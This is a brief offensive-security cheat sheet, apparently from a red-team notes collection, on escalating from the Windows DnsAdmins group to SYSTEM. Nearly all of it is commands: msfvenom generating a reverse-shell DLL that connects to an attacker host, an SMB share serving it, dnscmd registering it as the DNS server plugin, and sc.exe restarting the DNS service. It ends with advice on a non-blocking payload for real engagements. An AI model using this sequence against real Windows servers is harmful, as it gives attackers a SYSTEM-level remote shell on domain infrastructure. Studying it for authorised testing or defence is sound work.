# DnsAdmins dnscmd DLL Injection

Members of `DnsAdmins` can configure a server-level plugin DLL loaded by the DNS service (runs as SYSTEM).

```bash
# 1. Generate DLL payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o rev.dll

# 2. Host on SMB share
smbserver.py s .

# 3. Set the plugin DLL via dnscmd
dnscmd.exe /config /serverlevelplugindll \\<LHOST>\s\rev.dll

# 4. Restart DNS service (requires DnsAdmins + sc perms, or default allows it)
sc.exe \\<TARGET> stop dns
sc.exe \\<TARGET> start dns
```

Shell returns as `NT AUTHORITY\SYSTEM` — DNS service loads your DLL on start.

**Note:** Standard msfvenom DLL will hang DNS service; for real engagements, use a non-blocking payload (new thread then return).
